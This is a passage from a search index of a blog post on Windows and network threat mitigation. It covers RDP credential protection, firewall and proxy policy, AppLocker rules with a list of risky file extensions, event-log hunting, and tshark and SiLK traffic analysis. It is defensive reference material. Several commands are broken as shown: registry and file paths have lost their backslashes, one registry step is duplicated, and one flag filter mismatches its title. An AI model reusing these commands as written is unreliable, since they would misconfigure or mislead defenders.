Policy Management (gpmc.msc or via MMC Group Policy Object Editor)\n2. Computer Configuration &gt; Windows Settings &gt; Local Policies &gt; User Rights Assignment\n3. Deny access to this computer from the network: Local account and member of Administrators group\n4. Deny log on through Remote Desktop Services: Local account and member of Administrators group\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#remote-connections","title":"Remote Connections","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#rdp-restricted-admin-connect-to-only-1-resource","title":"RDP Restricted Admin (Connect to only 1 resource)","text":"<p><code>mstsc /v:server /restrictedAdmin</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-restricted-admin-via-registry","title":"Enable Restricted Admin via Registry","text":"<p><code>Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin=0</code></p> <p>or</p> <p><code>reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-restricted-admin-via-gpo","title":"Enable Restricted Admin via GPO","text":"<pre><code>1. Open Group Policy Management (gpmc.msc or via MMC Group Policy Object Editor)\n2. Computer Configurations &gt; Policies &gt; Administrative Templates &gt; System &gt; Credential Delegation\n3. Set \"Restrict Delegation of credential to remote servers\" to enable\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#rdp-windows-defender-remote-credential-guard-connect-to-multiple-resources","title":"RDP Windows Defender Remote Credential Guard (Connect to multiple resources)","text":"<p><code>mstsc /v:server /remoteguard</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-windows-defender-credential-guard-via-registry","title":"Enable Windows Defender Credential Guard via Registry","text":"<p><code>Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin=0</code></p> <p>or</p> <p><code>reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-windef-cred-guard-via-gpo","title":"Enable WinDef Cred Guard via GPO","text":"<pre><code>1. Open Group Policy Management (gpmc.msc or via MMC Group Policy Object Editor)\n2. Computer Configurations &gt; Policies &gt; Administrative Templates &gt; System &gt; Credential Delegation\n3. Set \"Restrict Delegation of credential to remote servers\" to enable\n4. In Options, Under use the following restricted mode: Choose \"Prefer Windows Defender Remote Credential Guard\"\n</code></pre> <p>Note</p> <p>If all systems are Windows 10/2016, Choose \"Require Remote Credential Guard\"</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#limit-client-to-client-communication-implement-and-configure-host-based-firewalls","title":"Limit Client-to-Client Communication (Implement and Configure Host Based Firewalls)","text":"<ul> <li>Clients and Server should be split into separate OU's</li> <li>Enable the Windows Firewall through GPO</li> <li>(Optional) Add exceptions to systems that are used to manage other hosts such as Sysadmins. Use a jump host to minimize exposure.</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-firewall","title":"Enable Firewall","text":"<p>PowerShell</p> <ol> <li>Create a GPO to hold the Workstation FW settings (workstation_fw)</li> </ol> <p>Example</p> <pre><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True \u2013PolicyStore example_domain.localworkstation_fw\nSet-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow \u2013NotifyOnListen True -AllowUnicastResponseToMulticast True \u2013LogFileName %SystemRoot%System32LogFilesFirewallpfirewall.log \u2013PolicyStore example_domain.localworkstation_fw\n</code></pre> <ol> <li>Assign the GPO to a Workstation Container</li> </ol> <p>References</p> <ul> <li>https://technet.microsoft.com/en-us/library/hh831755(v=ws.11).aspx</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#blockcontrol-tcpudp-access-from-the-internal-network-and-dmz","title":"Block/control TCP/UDP access from the Internal network and DMZ","text":"<ul> <li>Evaluate the need for servers to connect to the Internet.</li> <li>Create a list of systems outside the network that require access. Limit access using this whitelist.</li> <li>Configure firewall rules to enforce these traffic policies.</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#block-out-bound-tcpudp-access-from-the-client-systems-to-outbound-networks","title":"Block out bound TCP/UDP access from the Client systems to outbound networks.","text":"<p>Clients generally only need a few ports to connect out bound. Limit access from client workstations to these ports.</p> <ul> <li>Create a list of ports required by clients to communicate outside the network. Limit access using this whitelist.</li> <li>Configure firewall rules to enforce these traffic policies.</li> <li>Rule can be managed at the HOST level via GPO or the network level via firewall rules.</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#implement-a-proxy-for-all-outbound-traffic","title":"Implement a Proxy for All Outbound Traffic","text":"<p>Force systems to traverse an proxy to communicate outbound. It is preferred to only allow authenticated communications. This prevents privilege users (SYSTEM, root) from communicating outbound.</p> <ul> <li>At a minimum, force all client's HTTP(S) and DNS through a proxy</li> <li>If possible, require user authentication</li> <li>Prevent outbound access if a client or system attempts to connect to external port directly using network firewall rules</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#create-a-new-gpo-to-manage-the-proxy-settings","title":"Create a new GPO to manage the proxy settings","text":"<p>Edit the GPO</p> <p><code>User Configuration&gt;Windows Settings&gt;Internet Explorer Maintenance&gt;Connection</code></p> <pre><code>Select Proxy Server\nEnter the Proxy IP address and Port\n</code></pre> <p>Prevent Users from Changing Settings</p> <pre><code>User Configuration&gt;Administrative Templates&gt;Windows Components&gt;Internet Explorer&gt;Internet Control Panel\nSet Disable the Connections Page to Enabled\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#configurations","title":"Configurations","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#autoruns","title":"AutoRuns","text":"<pre><code>1. De-select \"Hide Microsoft Entries\"\n2. De-select \"Hide Windows Entries\"\n3. Under Scan Options, enable \"Verify code signatures\"\n4. Under Scan Options, enable \"Check VirusTotal.com\" (note this shouldn't be done on GOV or otherwise sensitive networks)\n5. Review all entries with multiple parameters\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#application-whiteblack-listing","title":"Application White/Black listing","text":"<p>A number of solutions exist to limit the applications a user can use on a system. AppLocker allows you to specify which users or groups can run particular applications in your organization based on unique identities of files. If you use AppLocker, you can create rules to allow or deny applications from running.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applocker","title":"Applocker","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applocker-executable-path-restrictions","title":"AppLocker Executable Path Restrictions","text":"<pre><code>1. Open Group Policy Management (gpmc.msc or via MMC Group Policy Object Editor)\n2. Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Application Control Policies &gt; AppLocker\n3. Configure rule enforcement\n4. Executable rules, Check Configured, Enforce rules\n5. Overview &gt; Executable Rules &gt; Right Click Create New Rule\n6. Permissions &gt; Deny &gt; Domain Users\n7. Conditions &gt; Path\n8. Exceptions &gt; Add as/if required\n9. Create &gt; Yes\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-paths","title":"Interesting Paths","text":"<pre><code>1. &lt;drive letter&gt;users&lt;username&gt;appdata (%AppData% or for extension %AppData%*.exe 5AppData%**.exe)\n2. users\u0007ppdatalocal\n3. users\u0007ppdatalocaltemp\n4. users\u0007ppdataroaming\n5. programdata\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#explicit-whitelisting","title":"Explicit Whitelisting","text":"<pre><code>1. Open Group Policy Management (gpmc.msc or via MMC Group Policy Object Editor)\n2. Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Software Restriction Policies\n3. Security Level Disallowed\n4. In additional rules allow\na. %HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionSystemRoot%\nb. %HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir (x86)%\nc. %HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir%\nd. *.lnk\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-file-extensions","title":"Interesting file extensions","text":"<p><code>.ade, .adp, .ani, .bas, .bat, .chm, .cmd, .com, .cpl, .crt, .exe, .hlp, .ht, .hta, .inf, .ins, .isp, .jar, .job, .js, .jse, .lnk, .mda, .mdb, .mde, .mdz, .msc, .msi, .msp, .mst, .ocx, .pcd, .ps1, .reg, .scr, .sct, .shs, .svg, .url, .vb, .vbe, .vbs, .wbk, .wsc, .ws, .wsf, .wsh, .exe, .pif, .pub, .ip</code></p> <p>References</p> <ul> <li>https://technet.microsoft.com/en-us/library/dd759117(v=ws.11).aspx</li> <li>https://technet.microsoft.com/en-us/library/dd759123(v=ws.11).aspx</li> <li>https://technet.microsoft.com/en-us/library/dd759116(v=ws.11).aspx</li> </ul>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#manual-hunting-and-detection-examples","title":"Manual Hunting and Detection Examples","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#filtering-event-logs-via-powershell","title":"Filtering Event Logs via PowerShell","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#log-locations-on-disk-only-use-event-viewer-or-cli-to-copy","title":"Log locations on disk (only use event viewer or cli to copy)","text":"<ol> <li>XP or older: %windir%system32config</li> <li>Vista or newer: %windir%system32winevtlogs</li> </ol>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-times-service-was-installed-all-evtx-files-should-be-system-and-count","title":"Get times Service was installed (all evtx files, should be system) and count","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"*.evtx\"; ID=7045}|Measure-Object -Line</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-blocked-events","title":"Get blocked events","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"AppLocker.evtx\"; ID=8004}| Format-Table -Wrap</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-windowsdefender-actions","title":"Get WindowsDefender actions","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"WindowsDefender.evtx\"; ID=1117}| Format-Table</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-windowsdefender-detections","title":"Get WindowsDefender detections","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"WindowsDefender.evtx\"; ID=1116}| Format-Table</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-files-by-extension-with-search-from-application-crash","title":"Get files (by extension) with search from Application (crash)","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"application.evtx\"}|Where {$_.Message -like \"*pdf*\"}|Format-Table -Wrap</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-emet-events","title":"Get EMET events","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"Win7-Application.evtx\"; providername=\"EMET\"}|Format-Table -Wrap</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-service-installs-and-errors","title":"Get service installs and errors","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"system.evtx\"; ID=7030,7045}| fl</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-usb-loading","title":"Search for USB loading","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"system.evtx\"; ID=7045,10000,10001,10100,20001,20002,30003,24576,24577,24579}|Where {$_.Message -like \"*USB*\"}|fl</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-errorwarninginfo","title":"Search for error/warning/info","text":"<p><code>Get-WinEvent -FilterHashtable @{Path=\"application.evtx\"; level=2}</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-remote-eventlog-caution-this-drops-credentials-onto-remote-system","title":"Get remote eventlog (caution this drops credentials onto remote system)","text":"<pre><code>Get-EventLog -List -ComputerName &lt;ip&gt;\nGet-EventLog -LogName System -ComputerName\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-log-within-x-hours","title":"Get log within X hours","text":"<p><code>Get-EventLog System -after (get-date).addhours(-12) | Where {$_.entrytype -eq \"warning\"}</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-logs-during-downtime","title":"Get logs during \"downtime\"","text":"<p><code>Get-EventLog -LogName security | ? {$_.EventId -eq 4624 \u2013and ($_.TimeGenerated.TimeOfDay -gt '20:00:00' -or $_.TimeGenerated.TimeOfDay -lt '08:00:00' ) } | export-csv offhours.csv</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-wevtutil-to-export-logs-export-log","title":"Use wevtutil to export logs (export-log)","text":"<p><code>wevtutil.exe epl system system.evtx</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-wevutil-to-get-last-20-startups-use-rcomputer-for-remote-and-qe-for-short-query","title":"Use wevutil to get last 20 startups (use /r:computer for remote and qe for short query)","text":"<p><code>wevutil query-events System /count:20 /rd:true /format:text /q:\"Event[System[(EventID=12)]]\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#windows-consolidated-logging","title":"Windows consolidated logging","text":"<ol> <li>enable winrm</li> <li><code>winrm qc</code></li> <li>enable wecutil</li> <li><code>wecutil qc</code></li> <li>Create subscriptions and select events/filters in event viewer</li> <li>via event viewer or</li> <li>by PowerShell<ul> <li><code>wecutil cs \"Creates a subscription\"</code></li> <li><code>wecutil ss \"Sets a subscription\"</code></li> <li><code>wecutil es \"Views subscriptions\"</code></li> </ul> </li> </ol>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-a-detailed-list-of-all-security-auditing-event-entries-use-an-elevated-prompt","title":"Get a detailed list of all security-auditing event entries (use an elevated prompt)","text":"<p><code>wevtutil gp Microsoft-Windows-Security-Auditing /ge /gm:true</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#return-a-list-of-all-security-auditing-categories-and-subcategories-use-an-elevated-prompt","title":"Return a list of all security-auditing categories and subcategories (use an elevated prompt)","text":"<p><code>auditpol /list /subcategory:*</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#network","title":"Network","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#network-flow-basics","title":"Network Flow Basics:","text":"<ol> <li>Prevent traffic on uncommon ports (not if a good threat)</li> <li>Establish commonality in traffic (size, frequency, browser headers, etc.)</li> <li>Consistently review outlying DNS entries (very few connections or host traffic)</li> <li>Identify and investigate unique User-Agent strings</li> <li>Identify and investigate Base64 encoded strings within the URL</li> <li>Identify and investigate executables being downloaded and traversing the network</li> </ol>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#basic-pcap-carving-nix","title":"Basic PCAP Carving (*nix)","text":"<p>Note: The snippets below are examples for pcap carving. I'd highly recommend using bro/ for traffic analysis.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-certificates-from-pcap-use-bro-if-possible","title":"Get certificates from pcap (use BRO if possible)","text":"<p><code>tshark -nr file.pcap -2 -R \"ssl.handshake.certificate\" -V &gt; cert.txt</code></p> <p>or</p> <p><code>ssldump -Nr /path/file.pcap | awk 'BEGIN {c=0;} { if ($0 ~ /^[ ]+Certificate$/) {c=1; print \"========================================\";} if ($0 !~ /^ +/ ) {c=0;} if (c==1) print $0; }'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-certificates-see-bro","title":"View certificates (see BRO)","text":"<p><code>openssl x509 -in certsname.der -inform der -text -noout</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-dns-queries-from-pcap-and-count-instances","title":"Get DNS queries from pcap and count instances","text":"<p><code>tshark -r /path/file.pcap -T fields -e ip.src -e dns.qry.name -2 -R \"dns.flags.response eq 0\"</code></p> <p>or</p> <p><code>tcpdump \u2013n \u2013r file.pcap \"port 53\" 2&gt;/dev/null|grep \u2013E 'A?'|awk '{print $(NF-1)}'|sort|uniq \u2013c|sort \u2013n</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-dns-queries-from-nx-domain","title":"Get DNS queries from NX domain","text":"<p><code>tshark -r /path/file.pcap -T fields -e ip.src -e dns.qry.name -2 -R \"dns.flags.rcode eq 3\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#dns-response-codes","title":"DNS Response Codes","text":"RCODE Name Description 0 NoError No Error 1 FormErr Format Error 2 ServFail Server Failure 3 NXDomain Non-Existent Domain 4 NotImp Not Implemented 5 Refused Query Refused 6 YXDomain Name Exists when it should not 7 YXRRSet RR Set Exists when it should not 8 NXRRSet RR Set that should exist does not 9 NotAuth Server Not Authoritative for zone 9 NotAuth Not Authorized 10 NotZone Name not contained in zone 16 BADVERS Bad OPT Version 16 BADSIG TSIG Signature Failure 17 BADKEY Key not recognized 18 BADTIME Signature out of time window 19 BADMODE Bad TKEY Mode 20 BADNAME Duplicate key name 21 BADALG Algorithm not supported 22 BADTRUNC Bad Truncation 23 BADCOOKIE Bad/missing Server Cookie"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-user-agents-from-pcap","title":"Get User-Agents from pcap","text":"<p><code>tshark -r /path/file.pcap -T fields -e http.user_agent|sort -n -k1|uniq -c|sort -n</code></p> <p>or</p> <p><code>tcpdump \u2013n \u2013A \u2013r file.pcap 'tcp port 80'|egrep \u2013I \"User-Agent\"|sort|uniq \u2013c|sort -n</code></p> <p>or</p> <p><code>strings /path/file.pcap |grep -i User-Agent|uniq -c|sort -n</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-info-for-frame-containing-search-dataf","title":"Get info for frame containing search dataf","text":"<p><code>tshark -r /tmp/10.10.10.52:1082_10.10.19.32:80-6.raw -2 -R 'frame contains \"MZ\"'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-string-in-tcp-data-finds-data-not-in-field-ie-ua-in-json","title":"Search for string in tcp data (finds data not in field i.e. UA in json)","text":"<p><code>tshark -r /path/file.pcap -T pdml -T fields -e tcp.data -2 -R 'tcp contains \"User-Agent\"'|sed s/://g|xxd -p -r|grep -a User-Agent|uniq -c</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#find-strings-in-pcap","title":"Find strings in pcap","text":"<p><code>tshark -r file.pcap -T pdml -T fields -e irc.response -Y 'frame contains \"badguy\"'</code></p> <p>or</p> <p><code>tshark -r file.pcap -T pdml -Y 'frame contains \"badguy\"'|grep badguy</code></p> <p>or</p> <p><code>ngrep -q -I /path/file.pcap \"badguy\"</code></p> <p>or</p> <p><code>strings /path/file.pcap |grep -i User-Agent |sort -u</code></p> <p>or</p> <p><code>tshark -r /path/file.pcap -T pdml -2 -R 'frame contains \"User-Agent\"'|grep User-Agent</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-the-frame-that-contains-string","title":"Get the frame that contains string","text":"<p><code>tshark -r file.pcap -2 -R 'frame contains \"badguy\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#show-packet-data-by-field","title":"Show packet data by field","text":"<p><code>tshark -nr /path/file.pcap -T fields -e http.user_agent -2 -R http.user_agent</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-data-hex-from-first-two-packets-in-pcap","title":"Get data &amp; hex from first two packets in pcap","text":"<p><code>tcpdump -n -r /path/file.pcap -c2 -x -v</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-that-have-tcp-header-length-gt-20-and-port-25","title":"Get frames that have tcp header length gt 20 and port 25","text":"<p><code>tshark -r /path/file.pcap -Y 'tcp.hdr_len &gt; 20 &amp;&amp; tcp.port == 25'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-data-in-frames-that-have-tcp-header-length-gt-20-and-port-25","title":"Get data in frames that have tcp header length gt 20 and port 25","text":"<p><code>tshark -r /path/file.pcap -T pdml -T fields -e tcp.port -e tcp.hdr_len -Y 'tcp.hdr_len &gt; 20 &amp;&amp; tcp.port == 25'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-with-hex-data-0x7932","title":"Get frames with hex data 0x7932","text":"<p><code>tshark -r /path/file.pcap -Y 'ip.id == 0x7932'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-and-show-hex-data","title":"Get frames and show hex data","text":"<p><code>tshark -r /path/file.pcap -T pdml -T fields -e ip.id -Y 'ip.id == 0x7932'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-all-arp-request-and-count-request1-reply2","title":"Get all arp request and count (request=1, reply=2)","text":"<p><code>tshark -r file.pcap -Y 'arp.opcode == 1'|wc -l</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-iplen-less-than-46-64-for-ethernet-minus-14-header-and-4-trailer-icmp-of-0","title":"Get ip.len less than 46 (64 for ethernet minus 14 header and 4 trailer) &amp; icmp of 0","text":"<p><code>tshark -r file.pcap -Y 'ip.len &lt; 46 &amp;&amp; icmp.type == 0'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-ip-option-of-loose-src-routing-with-offset-starting-at-ip-options","title":"Get ip option of loose src routing with offset starting at ip options","text":"<p><code>tshark -r file.pcap -Y 'ip[20] == 0x83 &amp;&amp; ip.hdr_len &gt;20'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#filter-info","title":"Filter Info","text":"<pre><code>URG = 32 or 0x20\nACK = 16 or 0x10\nPSH = 8 or 0x08\nRST = 4 or 0x04\nSYN = 2 or 0x02\nFIN = 1 or 0x01\nAll = 0xFF\n</code></pre> <p>Examples: <code>'tcp[13] &amp; 2 !=0' Get all SYN</code></p> <p><code>'tcp[13] &amp; 4 !=0' Get all RST</code></p> <p><code>'tcp[13] &amp; 16 !=0' Get all ACK</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-ip-src-and-ack-flag-set","title":"Get frame with IP src and ACK flag set","text":"<p><code>tshark -n -r /path/file.pcap '((ip.src == 192.168.10.1) and (tcp.flags.ack==1))'</code></p> <p>or</p> <p><code>tshark -n -r /path/file.pcap 'tcp[13] == 0x10 &amp;&amp; ip.src == 192.168.10.1'</code></p> <p>or</p> <p><code>tcpdump -n -r /path/file.pcap 'src host 192.168.10.1 and tcp[13] = 0x10'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-ip-src-and-ack-or-rst-flag-set","title":"Get frame with IP src and ACK or RST flag set","text":"<p><code>tshark -n -r /path/file.pcap '((ip.src == 192.168.10.1) and (tcp.flags.syn==1 or tcp.flags.reset==1))'</code></p> <p>or</p> <p><code>tshark -n -r /path/file.pcap 'ip.src == 192.168.10.1 &amp;&amp; tcp[13] == 0x14 or tcp[13] == 0x10 or tcp[13] == 0x04'</code></p> <p>or</p> <p><code>tcpdump -n -r /path/file.pcap 'src host 192.168.10.1 and tcp[13] &amp; 0x14 !=0'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-dst-port-0-and-df-flag-set","title":"Get frame with dst port 0 and DF flag set","text":"<p><code>tshark -n -r /path/file.pcap 'tcp.port == 0 &amp;&amp; ip[6] == 0x40'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-net-1010101024","title":"Get frame with net 10.10.10.10/24","text":"<p><code>tcpdump -n -r /path/file.pcap 'dst net 10.10.10 and ip[19] &amp; 0xd0 = 0xd0'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-by-ip","title":"Get frames by ip","text":"<p><code>tshark -n -r file.pcap '((ip.addr == 10.10.10.10) and (ip.addr == 192.168.10.11))'</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-specific-frame-verbose-note-tcp-stream-index-number","title":"View specific frame verbose (note tcp stream index number)","text":"<p><code>tshark -n -r file.pcap -Y frame.number==12 -V</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#follow-tcp-stream-0-ascii-raw-hex","title":"Follow tcp stream 0 (ascii, raw, hex)","text":"<p><code>tshark -n -r file.pcap -z \"follow,tcp,ascii,0\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#flow-data-analysis","title":"Flow Data Analysis","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-rwfilter-to-analyze-flow-data-by-ip-and-port","title":"Use rwfilter to analyze flow data by IP and port","text":"<p><code>rwfilter suspicious.silk --any-address=192.168.10.10 --aport=1088 --print-stat</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-detail-of-flow-data-by-ip-and-port","title":"View detail of flow data by IP and port","text":"<p><code>rwfilter suspicious.silk --any-address=192.168.10.10 --aport=1088 --pass=stdout|rwcut</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-all-udp-from-flow-then-pipe-to-get-field-4-4dst-port-3srcport-5proto-6packets-etc","title":"Extract all UDP from flow then pipe to get field 4 (4=dst port, 3=srcport, 5=proto, 6=packets, etc)","text":"<p><code>rwfilter suspicious.silk --proto=17 --pass=stdout|rwuniq --fields=4</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-connections-from-108-with-a-reset-to-close-then-pipe-to-get-srcip-count","title":"Extract connections from 10/8 with a reset to close then pipe to get srcIP count","text":"<p><code>rwfilter suspicious.silk --any-address=10.10.0.0/16 --flags-all=R/R --pass=stdout|rwuniq --fields=1</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-rwstats-to-get-flow-data-of-top-5-flows","title":"Use rwstats to get flow data of top 5 flows","text":"<p><code>rwstats suspicious.silk --fields sIP --bytes --count=5</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-records-not-icmp-tcp-or-udp-note-fail-and-have-src-ip-of-1010101","title":"Extract records not ICMP, TCP or UDP (note fail) and have src IP of 10.10.10.1","text":"<p><code>rwfilter suspicious.silk --proto=1,6,17 --fail=stdout|rwfilter --input-pipe=stdin --saddress=10.10.10.1 --pass=stdout | rwcut</code></p> <p>or</p> <p><code>rwfilter suspicious.silk --proto=0,2-5,7-16,18- --saddress=10.10.10.1 --pass=stdout | rwcut</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-top-5-ip-with-data-transfer","title":"Get top 5 IP with data transfer","text":"<p><code>rwstats phishing-attack.silk --fields=sip --top --bytes --count 5</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-flows-with-larger-than-100000-bytes","title":"Get flows with larger than 100,000 bytes","text":"<p><code>rwfilter phishing-attack.silk --proto=6 --bytes=100000- --pass=stdout |rwcut -f 1-8</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-queries","title":"ELSA (BRO queries)","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-most-common-svc","title":"ELSA most common svc","text":"<p><code>class=BRO_CONN groupby:service</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-nx-domains","title":"ELSA BRO nx domains","text":"<p><code>class=BRO_DNS nxdomain groupby:hostname</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-common-fqdn","title":"ELSA BRO common FQDN","text":"<p><code>class=BRO_HTTP \"-\" groupby:site</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-sites-hosting-exe","title":"ELSA BRO Sites hosting EXE","text":"<p><code>class=BRO_HTTP 